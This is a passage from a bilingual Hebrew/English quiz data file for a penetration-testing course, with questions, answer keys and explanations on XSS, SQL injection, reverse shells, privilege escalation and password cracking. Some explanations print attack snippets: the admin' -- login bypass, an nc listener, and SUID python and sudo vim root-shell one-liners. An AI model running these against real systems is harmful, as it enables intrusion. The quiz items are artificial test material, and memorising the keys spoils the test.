  605: [
    {
      q: "\u200Fמה ההבדל בין Reflected XSS ל־Stored XSS?",
      correct: "\u200FReflected — סקריפט מגיע מה־URL ודורש לחיצה על לינק\nStored — סקריפט נשמר ב־DB ופוגע בכל מבקר",
      choices: [
        "\u200FReflected — סקריפט מגיע מה־URL ודורש לחיצה על לינק\nStored — סקריפט נשמר ב־DB ופוגע בכל מבקר",
        "\u200FReflected פוגע רק בשרת\nStored פוגע רק בלקוח",
        "\u200FReflected הוא התקפת רשת\nStored הוא התקפת מסד נתונים",
        "\u200Fשניהם זהים\nההבדל הוא רק בשם"
      ],
      explanation: "‏Reflected XSS: הסקריפט מגיע כחלק מה־URL ומוחזר מיידית בתגובה — חומרה בינונית.\n\nעיקרי:\n- Stored XSS: הסקריפט נשמר במסד הנתונים (כמו בתגובה בפורום) ומוצג לכל מבקר — חומרה גבוהה\n- DOM-based: רץ בצד לקוח בלבד",
      explanationEn: "Reflected XSS: script comes from the URL and is immediately returned in the response — medium severity.\n\nMain Points:\n- Stored XSS: script is saved in the database (like a forum comment) and shown to every visitor — high severity\n- DOM-based: runs client-side only",
      qEn: "What is the difference between Reflected XSS and Stored XSS?",
      correctEn: "Reflected — script comes from URL and requires clicking a link\nStored — script is saved in DB and affects every visitor",
      choicesEn: [
        "Reflected — script comes from URL and requires clicking a link\nStored — script is saved in DB and affects every visitor",
        "Reflected only affects the server\nStored only affects the client",
        "Reflected is a network attack\nStored is a database attack",
        "Both are identical\nthe difference is only in name"
      ]
    },
    {
      q: "\u200Fמהי SQL Injection ומה ה-payload הקלאסי לעקיפת לוגין?",
      correct: "\u200Fהזרקת שאילתות SQL דרך קלט המשתמש\nPayload: admin' -- (מבטל את תנאי הסיסמה)",
      choices: [
        "\u200Fהזרקת שאילתות SQL דרך קלט המשתמש\nPayload: admin' -- (מבטל את תנאי הסיסמה)",
        "\u200Fמחיקת מסד הנתונים\nדרך ממשק הניהול",
        "\u200Fהזרקת JavaScript\nלדף ווב פגיע",
        "\u200Fשליחת בקשות HTTP מרובות\nלהפלת השרת"
      ],
      explanation: "‏SQL Injection: הקלט admin' -- הופך את השאילתה ל־SELECT * FROM users WHERE username='admin'--' AND password='' — ה-comment (--) מבטל את בדיקת הסיסמה.\n\nעיקרי:\n- הגנה: Prepared Statements",
      explanationEn: "SQL Injection: the input admin' -- turns the query into SELECT * FROM users WHERE username='admin'--' AND password='' — the comment (--) cancels the password check.\n\nMain Points:\n- Defense: Prepared Statements",
      qEn: "What is SQL Injection and what is the classic login bypass payload?",
      correctEn: "Injecting SQL queries through user input\nPayload: admin' -- (cancels the password condition)",
      choicesEn: [
        "Injecting SQL queries through user input\nPayload: admin' -- (cancels the password condition)",
        "Deleting the database\nthrough the admin interface",
        "Injecting JavaScript\ninto a vulnerable web page",
        "Sending multiple HTTP requests\nto crash the server"
      ]
    },
    {
      q: "\u200Fמהי ההגנה הטובה ביותר מפני SQL Injection?",
      correct: "\u200FPrepared Statements (Parameterized Queries)\nמפרידים בין הקוד SQL לנתונים",
      choices: [
        "\u200FPrepared Statements (Parameterized Queries)\nמפרידים בין הקוד SQL לנתונים",
        "\u200Fהגבלת אורך הקלט\nל־50 תווים",
        "\u200Fהוספת CAPTCHA\nלטופס הלוגין",
        "\u200Fשימוש ב־HTTPS\nבמקום HTTP"
      ],
      explanation: "‏Prepared Statements מפרידים בין הקוד לנתונים: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)).\n\nעיקרי:\n- הנתונים לעולם לא מתפרשים כקוד SQL\n- סינון קלט ו־WAF הם שכבות נוספות אבל לא תחליף",
      explanationEn: "Prepared Statements separate code from data: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)).\n\nMain Points:\n- Data is never interpreted as SQL code\n- Input filtering and WAF are additional layers but not a replacement",
      qEn: "What is the best defense against SQL Injection?",
      correctEn: "Prepared Statements (Parameterized Queries)\nseparate SQL code from data",
      choicesEn: [
        "Prepared Statements (Parameterized Queries)\nseparate SQL code from data",
        "Limiting input length\nto 50 characters",
        "Adding CAPTCHA\nto the login form",
        "Using HTTPS\ninstead of HTTP"
      ]
    },
    {
      q: "\u200Fמהי SSRF ובמה היא שונה מ־CSRF?",
      correct: "\u200FSSRF — תוקף מאלץ את השרת לבצע בקשות לשרתים פנימיים\nCSRF — תוקף מאלץ את הדפדפן של המשתמש לבצע פעולות",
      choices: [
        "\u200FSSRF — תוקף מאלץ את השרת לבצע בקשות לשרתים פנימיים\nCSRF — תוקף מאלץ את הדפדפן של המשתמש לבצע פעולות",
        "\u200FSSRF ו־CSRF הם אותו דבר\nרק שם שונה",
        "\u200FSSRF תוקף את הדפדפן\nCSRF תוקף את השרת",
        "\u200FSSRF קשור ל־SQL\nCSRF קשור ל־XSS"
      ],
      explanation: "‏SSRF (Server-Side Request Forgery): השרת הוא הקורבן — מאלצים אותו לבצע בקשות לשרתים פנימיים (למשל AWS metadata).\n\nעיקרי:\n- CSRF (Cross-Site Request Forgery): המשתמש הוא הקורבן — מאלצים את הדפדפן שלו לבצע פעולות (כמו העברת כסף)",
      explanationEn: "SSRF (Server-Side Request Forgery): the server is the victim — forcing it to make requests to internal servers (e.g.\n\nMain Points:\n- AWS metadata)\n- CSRF (Cross-Site Request Forgery): the user is the victim — forcing their browser to perform actions (like transferring money)",
      qEn: "What is SSRF and how is it different from CSRF?",
      correctEn: "SSRF — attacker forces the server to make requests to internal servers\nCSRF — attacker forces the user's browser to perform actions",
      choicesEn: [
        "SSRF — attacker forces the server to make requests to internal servers\nCSRF — attacker forces the user's browser to perform actions",
        "SSRF and CSRF are the same thing\njust different names",
        "SSRF attacks the browser\nCSRF attacks the server",
        "SSRF is related to SQL\nCSRF is related to XSS"
      ]
    },
    {
      q: "\u200Fמה תפקידו של Burp Suite בבדיקת חדירה?",
      correct: "\u200FProxy שיושב בין הדפדפן לשרת — מיירט, משנה\nומשחזר בקשות HTTP/HTTPS",
      choices: [
        "\u200FProxy שיושב בין הדפדפן לשרת — מיירט, משנה\nומשחזר בקשות HTTP/HTTPS",
        "\u200Fכלי לסריקת פורטים\nבדומה ל־Nmap",
        "\u200Fמערכת הפעלה\nלבדיקות חדירה",
        "\u200Fכלי לפריצת סיסמאות\nבדומה ל־Hashcat"
      ],
      explanation: "‏Burp Suite הוא כלי הבדיקה המרכזי לאפליקציות ווב.\n\nעיקרי:\n- מרכיבים: Proxy (יירוט בקשות), Repeater (שליחה חוזרת עם שינויים), Intruder (brute force/fuzzing), Scanner (סריקת חולשות — Pro), Decoder (המרת קידודים)",
      explanationEn: "Burp Suite is the main testing tool for web applications.\n\nMain Points:\n- Components: Proxy (intercept requests), Repeater (resend with modifications), Intruder (brute force/fuzzing), Scanner (vulnerability scanning — Pro), Decoder (encoding conversion)",
      qEn: "What is the role of Burp Suite in penetration testing?",
      correctEn: "A proxy between browser and server — intercepts, modifies\nand replays HTTP/HTTPS requests",
      choicesEn: [
        "A proxy between browser and server — intercepts, modifies\nand replays HTTP/HTTPS requests",
        "A port scanning tool\nsimilar to Nmap",
        "An operating system\nfor penetration testing",
        "A password cracking tool\nsimilar to Hashcat"
      ]
    }
  ],
  606: [
    {
      q: "\u200Fמהו Reverse Shell ולמה הוא עדיף על Bind Shell?",
      correct: "\u200FReverse Shell — המטרה מתחברת בחזרה לתוקף\nעדיף כי עוקף firewalls שחוסמים חיבורים נכנסים",
      choices: [
        "\u200FReverse Shell — המטרה מתחברת בחזרה לתוקף\nעדיף כי עוקף firewalls שחוסמים חיבורים נכנסים",
        "\u200FReverse Shell מהיר יותר\nBind Shell בטוח יותר",
        "\u200FReverse Shell עובד רק על Linux\nBind Shell עובד רק על Windows",
        "\u200Fשניהם זהים\nההבדל הוא רק בשם הכלי"
      ],
      explanation: "‏Bind Shell: פותח פורט על המטרה ומחכה לחיבור — בדרך כלל חסום על ידי firewall.\n\nעיקרי:\n- Reverse Shell: המטרה יוזמת חיבור החוצה לתוקף — עוקף firewalls כי חיבורים יוצאים בדרך כלל מותרים\n- הפקודה nc -lvnp 4444 מקשיבה בצד התוקף",
      explanationEn: "Bind Shell: opens a port on the target and waits for connection — usually blocked by firewall.\n\nMain Points:\n- Reverse Shell: the target initiates an outbound connection to the attacker — bypasses firewalls since outgoing connections are usually allowed\n- Command nc -lvnp 4444 listens on the attacker's side",
      qEn: "What is a Reverse Shell and why is it preferred over Bind Shell?",
      correctEn: "Reverse Shell — the target connects back to the attacker\npreferred because it bypasses firewalls blocking incoming connections",
      choicesEn: [
        "Reverse Shell — the target connects back to the attacker\npreferred because it bypasses firewalls blocking incoming connections",
        "Reverse Shell is faster\nBind Shell is safer",
        "Reverse Shell works only on Linux\nBind Shell works only on Windows",
        "Both are identical\nthe difference is only in the tool name"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Exploit ל־Payload ב־Metasploit?",
      correct: "\u200FExploit — קוד שמנצל חולשה (כמו buffer overflow)\nPayload — מה שקורה אחרי הניצול (כמו reverse shell)",
      choices: [
        "\u200FExploit — קוד שמנצל חולשה (כמו buffer overflow)\nPayload — מה שקורה אחרי הניצול (כמו reverse shell)",
        "\u200FExploit ו־Payload הם אותו דבר\nרק שם שונה",
        "\u200FExploit הוא כלי הגנה\nPayload הוא כלי תקיפה",
        "\u200FExploit עובד על שרתים\nPayload עובד על מחשבים אישיים"
      ],
      explanation: "‏ב־Metasploit: Exploit = הקוד שמנצל חולשה ספציפית (buffer overflow, RCE).\n\nעיקרי:\n- Payload = מה שקורה אחרי ניצול מוצלח (reverse shell, Meterpreter)\n- Auxiliary = כלי עזר (סורקים)\n- Encoders = הסוואה מפני אנטי-וירוס",
      explanationEn: "In Metasploit: Exploit = code that exploits a specific vulnerability (buffer overflow, RCE).\n\nMain Points:\n- Payload = what happens after successful exploitation (reverse shell, Meterpreter)\n- Auxiliary = helper tools (scanners)\n- Encoders = evasion from antivirus",
      qEn: "What is the difference between Exploit and Payload in Metasploit?",
      correctEn: "Exploit — code that exploits a vulnerability (like buffer overflow)\nPayload — what happens after exploitation (like reverse shell)",
      choicesEn: [
        "Exploit — code that exploits a vulnerability (like buffer overflow)\nPayload — what happens after exploitation (like reverse shell)",
        "Exploit and Payload are the same thing\njust different names",
        "Exploit is a defense tool\nPayload is an attack tool",
        "Exploit works on servers\nPayload works on personal computers"
      ]
    },
    {
      q: "\u200Fמהו SUID ואיך הוא מנוצל ל־Privilege Escalation?",
      correct: "\u200FSUID גורם לתוכנית לרוץ עם הרשאות הבעלים (לרוב root)\nאם יש תוכנית SUID שמאפשרת הרצת פקודות — shell כ-root",
      choices: [
        "\u200FSUID גורם לתוכנית לרוץ עם הרשאות הבעלים (לרוב root)\nאם יש תוכנית SUID שמאפשרת הרצת פקודות — shell כ-root",
        "\u200FSUID הוא סוג של סיסמה\nלגישה למערכת",
        "\u200FSUID מצפין קבצים\nבמערכת הקבצים",
        "\u200FSUID הוא פרוטוקול רשת\nלתקשורת מאובטחת"
      ],
      explanation: "‏SUID (Set User ID): הרשאה שגורמת לתוכנית לרוץ עם ההרשאות של הבעלים.\n\nעיקרי:\n- מוצאים עם: find / -perm -4000\n- אם למשל python3 עם SUID: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' = root shell\n- מאגר GTFOBins מפרט טכניקות ניצול",
      explanationEn: "SUID (Set User ID): permission that makes a program run with the owner's privileges.\n\nMain Points:\n- Find with: find / -perm -4000\n- If python3 has SUID: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' = root shell\n- GTFOBins database lists exploitation techniques",
      qEn: "What is SUID and how is it exploited for Privilege Escalation?",
      correctEn: "SUID makes a program run with owner's permissions (usually root)\nif a SUID program allows command execution — root shell",
      choicesEn: [
        "SUID makes a program run with owner's permissions (usually root)\nif a SUID program allows command execution — root shell",
        "SUID is a type of password\nfor system access",
        "SUID encrypts files\nin the filesystem",
        "SUID is a network protocol\nfor secure communication"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה sudo -l ולמה היא חשובה ב־Privilege Escalation?",
      correct: "\u200Fמציגה אילו פקודות המשתמש רשאי להריץ עם sudo\nאם מותר vim/python/bash עם sudo — אפשר לקבל root shell",
      choices: [
        "\u200Fמציגה אילו פקודות המשתמש רשאי להריץ עם sudo\nאם מותר vim/python/bash עם sudo — אפשר לקבל root shell",
        "\u200Fמציגה את כל המשתמשים במערכת\nעם ההרשאות שלהם",
        "\u200Fנועלת את חשבון המשתמש\nלאחר ניסיונות כושלים",
        "\u200Fמוחקת את היסטוריית הפקודות\nשל המשתמש"
      ],
      explanation: "‏sudo -l מציגה מה מותר לך להריץ כ-root.\n\nעיקרי:\n- אם כתוב: (ALL) NOPASSWD: /usr/bin/vim — אפשר: sudo vim -c ':!/bin/bash' ולקבל shell כ-root\n- כלים כמו LinPEAS ו־WinPEAS מאתרים כאלה הזדמנויות אוטומטית",
      explanationEn: "sudo -l shows what you're allowed to run as root.\n\nMain Points:\n- If it says: (ALL) NOPASSWD: /usr/bin/vim — you can: sudo vim -c ':!/bin/bash' to get a root shell\n- Tools like LinPEAS and WinPEAS find such opportunities automatically",
      qEn: "What does the command sudo -l do and why is it important for Privilege Escalation?",
      correctEn: "Shows which commands the user can run with sudo\nif vim/python/bash is allowed with sudo — root shell is possible",
      choicesEn: [
        "Shows which commands the user can run with sudo\nif vim/python/bash is allowed with sudo — root shell is possible",
        "Shows all users in the system\nwith their permissions",
        "Locks the user account\nafter failed attempts",
        "Deletes the user's command history"
      ]
    },
    {
      q: "\u200Fמה עושה Meterpreter ומה היתרון שלו על shell רגיל?",
      correct: "\u200FPayload מתקדם של Metasploit עם יכולות מובנות:\nscreenshot, keylogger, hashdump, העלאת/הורדת קבצים",
      choices: [
        "\u200FPayload מתקדם של Metasploit עם יכולות מובנות:\nscreenshot, keylogger, hashdump, העלאת/הורדת קבצים",
        "\u200Fגרסה חדשה של Metasploit\nשמחליפה את msfconsole",
        "\u200Fכלי הגנה שמזהה תוקפים\nברשת הפנימית",
        "\u200Fפרוטוקול תקשורת מוצפן\nבין שני מחשבים"
      ],
      explanation: "‏Meterpreter הוא payload מתקדם שרץ בזיכרון (לא על הדיסק).\n\nעיקרי:\n- יכולות: sysinfo, getuid (מי אנחנו), screenshot, keyscan_start/dump (keylogger), hashdump (חילוץ hashes), upload/download קבצים, getsystem (escalation), ותנועה לרוחב הרשת",
      explanationEn: "Meterpreter is an advanced payload that runs in memory (not on disk).\n\nMain Points:\n- Capabilities: sysinfo, getuid (who are we), screenshot, keyscan_start/dump (keylogger), hashdump (extract hashes), upload/download files, getsystem (escalation), and lateral movement",
      qEn: "What does Meterpreter do and what is its advantage over a regular shell?",
      correctEn: "Advanced Metasploit payload with built-in capabilities:\nscreenshot, keylogger, hashdump, file upload/download",
      choicesEn: [
        "Advanced Metasploit payload with built-in capabilities:\nscreenshot, keylogger, hashdump, file upload/download",
        "A new version of Metasploit\nthat replaces msfconsole",
        "A defense tool that detects attackers\non the internal network",
        "An encrypted communication protocol\nbetween two computers"
      ]
    }
  ],
  607: [
    {
      q: "\u200Fמה ההבדל בין Brute Force ל־Dictionary Attack?",
      correct: "\u200FBrute Force — מנסה כל צירוף אפשרי (איטי אבל מקיף)\nDictionary — מנסה סיסמאות מרשימה מוכנה (מהיר יותר)",
      choices: [
        "\u200FBrute Force — מנסה כל צירוף אפשרי (איטי אבל מקיף)\nDictionary — מנסה סיסמאות מרשימה מוכנה (מהיר יותר)",
        "\u200FBrute Force עובד רק אונליין\nDictionary עובד רק אופליין",
        "\u200FBrute Force פורץ רק MD5\nDictionary פורץ רק SHA",
        "\u200Fשניהם מנסים את אותן סיסמאות\nבסדר שונה"
      ],
      explanation: "‏Brute Force מנסה כל צירוף (aaaa, aaab...) — סיסמה של 8 תווים = ~6.6 טריליון צירופים.\n\nעיקרי:\n- Dictionary Attack משתמש ברשימות כמו rockyou.txt (14 מיליון סיסמאות נפוצות) — הרבה יותר יעיל כי רוב האנשים משתמשים בסיסמאות נפוצות",
      explanationEn: "Brute Force tries every combination (aaaa, aaab...) — 8-char password = ~6.6 trillion combinations.\n\nMain Points:\n- Dictionary Attack uses lists like rockyou.txt (14 million common passwords) — much more efficient since most people use common passwords",
      qEn: "What is the difference between Brute Force and Dictionary Attack?",
      correctEn: "Brute Force — tries every possible combination (slow but thorough)\nDictionary — tries passwords from a prepared list (faster)",
      choicesEn: [
        "Brute Force — tries every possible combination (slow but thorough)\nDictionary — tries passwords from a prepared list (faster)",
        "Brute Force only works online\nDictionary only works offline",
        "Brute Force only cracks MD5\nDictionary only cracks SHA",
        "Both try the same passwords\nin different order"
      ]
    },
    {
      q: "\u200Fמהי Rainbow Table ומה ההגנה מפניה?",
      correct: "\u200Fטבלה מחושבת מראש של hash → סיסמה\nההגנה: Salt — מחרוזת אקראית שונה לכל משתמש",
      choices: [
        "\u200Fטבלה מחושבת מראש של hash → סיסמה\nההגנה: Salt — מחרוזת אקראית שונה לכל משתמש",
        "\u200Fרשימת סיסמאות נפוצות\nההגנה: סיסמה ארוכה יותר",
        "\u200Fכלי לפריצת WiFi\nההגנה: שינוי סיסמת הראוטר",
        "\u200Fסוג של התקפת רשת\nההגנה: Firewall"
      ],
      explanation: "‏Rainbow Table: טבלה מחושבת מראש — מחפשים hash ומקבלים סיסמה מיידית.\n\nעיקרי:\n- Salt: מוסיפים מחרוזת אקראית לכל סיסמה לפני hashing — אותה סיסמה מייצרת hash שונה לכל משתמש, מה שהופך Rainbow Tables לחסרות תועלת",
      explanationEn: "Rainbow Table: precomputed table — look up a hash and get the password instantly.\n\nMain Points:\n- Salt: add a random string to each password before hashing — same password produces different hash for each user, making Rainbow Tables useless",
      qEn: "What is a Rainbow Table and what is the defense against it?",
      correctEn: "A precomputed table of hash → password\nDefense: Salt — a different random string for each user",
      choicesEn: [
        "A precomputed table of hash → password\nDefense: Salt — a different random string for each user",
        "A list of common passwords\nDefense: a longer password",
        "A WiFi cracking tool\nDefense: changing the router password",
        "A type of network attack\nDefense: Firewall"
      ]
    },
    {
      q: "\u200Fלמה bcrypt עדיף על MD5 לאחסון סיסמאות?",
      correct: "\u200Fbcrypt איטי בכוונה (work factor) + salt מובנה\nMD5 מהיר מדי (10 מיליארד/שנייה ב־GPU) וללא salt",
      choices: [
        "\u200Fbcrypt איטי בכוונה (work factor) + salt מובנה\nMD5 מהיר מדי (10 מיליארד/שנייה ב־GPU) וללא salt",
        "\u200Fbcrypt יוצר hash קצר יותר\nולכן חוסך מקום באחסון",
        "\u200Fbcrypt עובד רק על Linux\nMD5 עובד רק על Windows",
        "\u200Fאין הבדל משמעותי\nשניהם בטוחים באותה מידה"
      ],
      explanation: "‏MD5: ~10 מיליארד ניסיונות/שנייה ב־GPU — לא בטוח לסיסמאות.\n\nעיקרי:\n- bcrypt: איטי בכוונה (work factor מתכוונן), salt מובנה, ~10,000-100,000 ניסיונות/שנייה\n- אלגוריתמים מודרניים נוספים: Argon2 (מנצח PHC), scrypt (דורש CPU + RAM)",
      explanationEn: "MD5: ~10 billion attempts/sec on GPU — not safe for passwords.\n\nMain Points:\n- bcrypt: intentionally slow (adjustable work factor), built-in salt, ~10,000-100,000 attempts/sec\n- Other modern algorithms: Argon2 (PHC winner), scrypt (requires CPU + RAM)",
      qEn: "Why is bcrypt better than MD5 for storing passwords?",
      correctEn: "bcrypt is intentionally slow (work factor) + built-in salt\nMD5 is too fast (10 billion/sec on GPU) and has no salt",
      choicesEn: [
        "bcrypt is intentionally slow (work factor) + built-in salt\nMD5 is too fast (10 billion/sec on GPU) and has no salt",
        "bcrypt produces shorter hashes\nand saves storage space",
        "bcrypt only works on Linux\nMD5 only works on Windows",
        "No significant difference\nboth are equally secure"
      ]
    },
    {
      q: "\u200Fמהי Password Spraying ולמה היא אפקטיבית?",
      correct: "\u200Fניסיון סיסמה נפוצה אחת נגד הרבה חשבונות\nאפקטיבית כי לא גורמת נעילה ותמיד מישהו עם סיסמה חלשה",
      choices: [
        "\u200Fניסיון סיסמה נפוצה אחת נגד הרבה חשבונות\nאפקטיבית כי לא גורמת נעילה ותמיד מישהו עם סיסמה חלשה",
        "\u200Fניסיון הרבה סיסמאות על חשבון אחד\nבזמן קצר",
        "\u200Fהפצת סיסמאות גנובות ברשת\nלמי שמעוניין",
        "\u200Fשינוי סיסמאות אוטומטי\nלכל המשתמשים"
      ],
      explanation: "‏Password Spraying: סיסמה אחת (כמו Company2024!) נגד מאות חשבונות — ניסיון אחד לחשבון לא מפעיל נעילה.\n\nעיקרי:\n- Credential Stuffing: credentials שדלפו מאתר אחד → ניסיון באתרים אחרים (מנצל שימוש חוזר בסיסמאות)",
      explanationEn: "Password Spraying: one password (like Company2024!) against hundreds of accounts — one attempt per account doesn't trigger lockout.\n\nMain Points:\n- Credential Stuffing: leaked credentials from one site → tried on other sites (exploits password reuse)",
      qEn: "What is Password Spraying and why is it effective?",
      correctEn: "Trying one common password against many accounts\neffective because it doesn't cause lockout and someone always has a weak password",
      choicesEn: [
        "Trying one common password against many accounts\neffective because it doesn't cause lockout and someone always has a weak password",
        "Trying many passwords on one account\nin a short time",
        "Spreading stolen passwords online\nfor anyone interested",
        "Automatic password changes\nfor all users"
      ]
    },
    {
      q: "\u200Fמה עושה Hydra ובמה הוא שונה מ־Hashcat?",
      correct: "\u200FHydra — brute force אונליין (SSH, HTTP, FTP בזמן אמת)\nHashcat — פריצת hash אופליין (קובץ hashes מקומי, GPU)",
      choices: [
        "\u200FHydra — brute force אונליין (SSH, HTTP, FTP בזמן אמת)\nHashcat — פריצת hash אופליין (קובץ hashes מקומי, GPU)",
        "\u200FHydra פורץ רק WiFi\nHashcat פורץ רק סיסמאות ווב",
        "\u200FHydra עובד רק על Windows\nHashcat עובד רק על Linux",
        "\u200Fשניהם עושים את אותו דבר\nרק בממשק שונה"
      ],
      explanation: "‏Hydra: brute force אונליין — מתחבר בזמן אמת לשירותים (SSH, FTP, HTTP POST, RDP) ומנסה credentials.\n\nעיקרי:\n- Hashcat: פריצה אופליין — מקבל קובץ hashes ומנסה למצוא את הסיסמאות באמצעות GPU\n- Hashcat מהיר הרבה יותר כי לא מוגבל לרשת",
      explanationEn: "Hydra: online brute force — connects in real-time to services (SSH, FTP, HTTP POST, RDP) and tries credentials.\n\nMain Points:\n- Hashcat: offline cracking — gets a hash file and tries to find passwords using GPU\n- Hashcat is much faster since it's not network-limited",
      qEn: "What does Hydra do and how is it different from Hashcat?",
      correctEn: "Hydra — online brute force (SSH, HTTP, FTP in real-time)\nHashcat — offline hash cracking (local hash file, GPU)",
      choicesEn: [
        "Hydra — online brute force (SSH, HTTP, FTP in real-time)\nHashcat — offline hash cracking (local hash file, GPU)",
        "Hydra only cracks WiFi\nHashcat only cracks web passwords",
        "Hydra only works on Windows\nHashcat only works on Linux",
        "Both do the same thing\njust with different interfaces"
      ]
    }
  ],
  608: [
    {
      q: "\u200Fמהם שלושת קהלי היעד של דוח בדיקת חדירה?",
      correct: "\u200Fהנהלה (Executive Summary), צוות טכני (פרטים מלאים)\nוצוות משפטי/רגולטורי (ציות לתקנים)",
      choices: [
        "\u200Fהנהלה (Executive Summary), צוות טכני (פרטים מלאים)\nוצוות משפטי/רגולטורי (ציות לתקנים)",
        "\u200Fלקוחות, ספקים ומתחרים",
        "\u200Fמפתחים, מעצבים ובודקי QA",
        "\u200Fרק צוות אבטחת המידע\nהדוח חסוי לחלוטין"
      ],
      explanation: "‏הנהלה רוצה לדעת: 'כמה אנחנו בסכנה.\n\nעיקרי:\n- כמה זה עולה לתקן?' צוות טכני רוצה: 'מה הבעיה\n- איך מתקנים?' צוות משפטי רוצה: הוכחות לציות לתקנים (PCI-DSS, ISO 27001, GDPR)",
      explanationEn: "Management wants to know: 'How much danger are we in.\n\nMain Points:\n- How much does it cost to fix?' Technical team wants: 'What's the problem\n- How do we fix it?' Legal team wants: proof of compliance with standards (PCI-DSS, ISO 27001, GDPR)",
      qEn: "What are the three target audiences of a penetration test report?",
      correctEn: "Management (Executive Summary), technical team (full details)\nand legal/regulatory team (compliance)",
      choicesEn: [
        "Management (Executive Summary), technical team (full details)\nand legal/regulatory team (compliance)",
        "Customers, suppliers and competitors",
        "Developers, designers and QA testers",
        "Only the security team\nthe report is completely confidential"
      ]
    },
    {
      q: "\u200Fמהו CVSS ומה טווח הציונים שלו?",
      correct: "\u200FCommon Vulnerability Scoring System — דירוג חומרה\n0-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical",
      choices: [
        "\u200FCommon Vulnerability Scoring System — דירוג חומרה\n0-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical",
        "\u200Fמערכת קידוד לחולשות\nעם ציונים מ־1 עד 5",
        "\u200Fכלי סריקה אוטומטי\nשמוצא חולשות בשרתים",
        "\u200Fסטנדרט להצפנת נתונים\nעם רמות אבטחה שונות"
      ],
      explanation: "‏CVSS v3.1 מעריך חולשות לפי: Attack Vector (Network/Local), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), והשפעה על Confidentiality, Integrity, Availability.\n\nעיקרי:\n- SQL Injection ללא אימות = 9.8 Critical",
      explanationEn: "CVSS v3.1 evaluates vulnerabilities by: Attack Vector (Network/Local), Attack Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), and impact on Confidentiality, Integrity, Availability.\n\nMain Points:\n- Unauthenticated SQL Injection = 9.8 Critical",
      qEn: "What is CVSS and what is its score range?",
      correctEn: "Common Vulnerability Scoring System — severity rating\n0-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical",
      choicesEn: [
        "Common Vulnerability Scoring System — severity rating\n0-3.9 Low, 4.0-6.9 Medium, 7.0-8.9 High, 9.0-10.0 Critical",
        "A vulnerability coding system\nwith scores from 1 to 5",
        "An automated scanning tool\nthat finds server vulnerabilities",
        "A data encryption standard\nwith different security levels"
      ]
    },
    {
      q: "\u200Fמהם המרכיבים החיוניים של Finding בדוח?",
      correct: "\u200FSeverity (CVSS), Description, Steps to Reproduce\nEvidence, Impact, Recommendation",
      choices: [
        "\u200FSeverity (CVSS), Description, Steps to Reproduce\nEvidence, Impact, Recommendation",
        "\u200Fרק שם החולשה וציון CVSS\nללא פרטים נוספים",
        "\u200Fקוד ה-exploit בלבד\nללא הסבר",
        "\u200Fצילום מסך אחד\nוהמלצה כללית"
      ],
      explanation: "‏כל Finding חייב לכלול\n\nעיקרי:\n- Severity/CVSS (חומרה)\n- Description (תיאור)\n- Steps to Reproduce (שלבי שחזור — כדי שהצוות יוכל לאמת)",
      explanationEn: "Every Finding must include: Severity/CVSS, Description, Steps to Reproduce (so the team can verify), Evidence (screenshots, logs), Impact, Recommendation, References (CWE, OWASP)..\n\nMain Points:\n- Every Finding must include: Severity/CVSS, Description, Step",
      qEn: "What are the essential components of a Finding in a report?",
      correctEn: "Severity (CVSS), Description, Steps to Reproduce\nEvidence, Impact, Recommendation",
      choicesEn: [
        "Severity (CVSS), Description, Steps to Reproduce\nEvidence, Impact, Recommendation",
        "Only the vulnerability name and CVSS score\nno additional details",
        "Only the exploit code\nno explanation",
        "One screenshot\nand a general recommendation"
      ]
    },
    {
      q: "\u200Fמהו הזמן המומלץ לתיקון חולשה ברמת Critical?",
      correct: "\u200F0-7 ימים — חולשות Critical ניתנות לניצול מיידי\nודורשות פעולה מידית",
      choices: [
        "\u200F0-7 ימים — חולשות Critical ניתנות לניצול מיידי\nודורשות פעולה מידית",
        "\u200F1-3 חודשים\nעם תכנון מסודר",
        "\u200F6-12 חודשים\nבמסגרת תקציב שנתי",
        "\u200Fאין דחיפות\nלפי נוחות הצוות"
      ],
      explanation: "‏סדר עדיפויות: Critical (0-7 ימים) — ניצול מיידי.\n\nעיקרי:\n- High (1-4 שבועות) — דורש תנאים\n- Medium (1-3 חודשים) — השפעה מוגבלת\n- Low (3-6 חודשים) — שיפורי best practices",
      explanationEn: "Priority order: Critical (0-7 days) — immediate exploitation.\n\nMain Points:\n- High (1-4 weeks) — requires conditions\n- Medium (1-3 months) — limited impact\n- Low (3-6 months) — best practice improvements",
      qEn: "What is the recommended time to fix a Critical severity vulnerability?",
      correctEn: "0-7 days — Critical vulnerabilities can be exploited immediately\nand require immediate action",
      choicesEn: [
        "0-7 days — Critical vulnerabilities can be exploited immediately\nand require immediate action",
        "1-3 months\nwith orderly planning",
        "6-12 months\nwithin annual budget",
        "No urgency\nat the team's convenience"
      ]
    },
    {
      q: "\u200Fמהם המרכיבים העיקריים של Executive Summary?",
      correct: "\u200Fסיכום ממצאים לפי חומרה, רמת סיכון כוללת\nוהמלצות מיידיות — ללא ז'רגון טכני",
      choices: [
        "\u200Fסיכום ממצאים לפי חומרה, רמת סיכון כוללת\nוהמלצות מיידיות — ללא ז'רגון טכני",
        "\u200Fרשימת כל הכלים שהשתמשנו בהם\nעם הפקודות",
        "\u200Fקוד ה-exploit המלא\nלכל חולשה שנמצאה",
        "\u200Fרק גרף עוגה\nעם אחוז החולשות"
      ],
      explanation: "‏Executive Summary נכתב להנהלה — ללא ז'רגון טכני.\n\nעיקרי:\n- כולל: מה נבדק ומתי, מספר ממצאים לפי חומרה (Critical/High/Medium/Low), רמת סיכון כוללת, השפעה עסקית (כמה רשומות בסכנה, קנסות רגולטוריים), ופעולות מיידיות נדרשות",
      explanationEn: "Executive Summary is written for management — no technical jargon.\n\nMain Points:\n- Includes: what was tested and when, number of findings by severity (Critical/High/Medium/Low), overall risk level, business impact (records at risk, regulatory fines), and immediate actions required",
      qEn: "What are the main components of an Executive Summary?",
      correctEn: "Summary of findings by severity, overall risk level\nand immediate recommendations — without technical jargon",
      choicesEn: [
        "Summary of findings by severity, overall risk level\nand immediate recommendations — without technical jargon",
